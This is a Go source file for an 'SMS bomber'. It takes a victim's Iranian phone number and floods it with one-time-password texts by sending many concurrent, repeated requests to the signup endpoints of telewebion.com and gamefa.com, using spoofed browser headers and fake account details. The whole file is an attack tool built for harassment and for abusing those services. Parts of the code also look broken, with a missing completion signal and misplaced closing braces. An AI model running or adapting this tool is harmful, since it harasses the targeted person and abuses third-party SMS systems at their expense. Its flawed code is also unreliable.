// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"  
        "net/http/cookiejar"  
)
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
	}
}//Code by @monsmain
//(faghat baraye site payagym.com)
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p) 
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p 
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}
func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*40)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {

// gateway.telewebion.com (SMS - POST JSON) - اضافه کردن هدرها و استفاده از client با کوکی
		wg.Add(1)
		tasks <- func() {
			// ساختار payload به صورت JSON
			payload := map[string]interface{}{
				"code": "98",
				"phone": getPhoneNumberNoZero(phone), // ارسال بدون صفر اول
				"smsStatus": "default",
			}

            jsonData, err := json.Marshal(payload)
            if err != nil {
                fmt.Printf("\033[01;31m[-] Error while encoding JSON for telewebion.com: %v\033[0m\n", err)
                ch <- http.StatusInternalServerError
                return
            }

			// ساخت درخواست با context و body
			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", bytes.NewBuffer(jsonData))
			if err != nil {
				fmt.Printf("\033[01;31m[-] Error while creating request to telewebion.com: %v\033[0m\n", err)
				ch <- http.StatusInternalServerError
				return
			}

			// اضافه کردن هدرهای درخواستی
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Accept", "application/json, text/plain, */*")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
			req.Header.Set("Origin", "https://gate.telewebion.com")
			req.Header.Set("Referer", "https://gate.telewebion.com/")
			req.Header.Set("Sec-Ch-Ua", "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
			req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
			req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
			req.Header.Set("Sec-Fetch-Dest", "empty")
			req.Header.Set("Sec-Fetch-Mode", "cors")
			req.Header.Set("Sec-Fetch-Site", "same-site")
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36")

			// ارسال درخواست با client جدید که کوکی ها را مدیریت می کند
			resp, err := client.Do(req) // استفاده از client به جای http.DefaultClient
			if err != nil {
				// مدیریت خطا
				fmt.Printf("\033[01;31m[-] Error sending request to telewebion.com: %v\033[0m\n", err)
				ch <- http.StatusInternalServerError
				return
			}
			defer resp.Body.Close()

			// گزارش وضعیت
			ch <- resp.StatusCode
		}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// gamefa.com (Register flow 2 - SMS OTP step - POST Form) - اضافه کردن digits_reg_username
		wg.Add(1)
		tasks <- func(c *http.Client) func() { // ساختار برای پاس دادن client
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "register")
				formData.Set("digt_countrycode", "+98")
				formData.Set("phone", getPhoneNumberNoZero(phone))
				formData.Set("email", "koyaref766@kazvi.com")
				formData.Set("digits_reg_password", "trrdfstrtft")
				formData.Set("digits_process_register", "1")
				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a") // ممکن است پویا باشد
				formData.Set("optional_data", "optional_data")
				formData.Set("dig_otp", "")
				formData.Set("digits", "1")
				formData.Set("digits_redirect_page", "//gamefa.com/")
				formData.Set("digits_form", "3827f92f86") // ممکن است پویا باشد
				formData.Set("_wp_http_referer", "/?login=true")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				// >>>>>> اضافه کردن پارامتر digits_reg_username <<<<<<
				formData.Set("digits_reg_username", "randomuser123") // یک مقدار نمونه، میتونی از یک تابع برای تولید اسم تصادفی استفاده کنی

				sendFormRequest(c, ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch) // ارسال c
			}
		}(client) // ارسال client اصلی به تابع خارجی
                    }
		}
//Code by @monsmain
	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
//Code by @monsmain
